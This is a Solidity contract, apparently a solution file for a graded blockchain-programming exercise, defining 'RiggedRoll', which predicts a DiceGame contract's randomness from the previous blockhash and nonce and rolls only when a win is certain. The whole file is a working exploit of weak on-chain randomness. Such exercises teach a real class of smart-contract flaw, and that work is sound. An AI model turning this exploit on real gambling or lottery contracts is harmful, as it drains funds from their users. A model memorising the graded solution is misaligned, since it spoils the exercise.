pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    // uint256 constant PROFIT_MARGIN = 0.0005 ether;

    error NotEnoughEther();

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address receiver, uint256 amount) onlyOwner external {
        payable(receiver).transfer(amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() onlyOwner external payable {
        if (address(this).balance < 0.002 ether) {
            revert NotEnoughEther();
        }

        uint256 submitValue = 0.002 ether;
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        // uint256 prize = diceGame.prize() + ((submitValue * 40) / 100);

        require(roll <= 5, "no prize, plz try again");
        // require(prize > submitValue + PROFIT_MARGIN, "prize sux");
        diceGame.rollTheDice{value: submitValue}();
        // payable(msg.sender).transfer(address(this).balance);
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() payable external {}

}
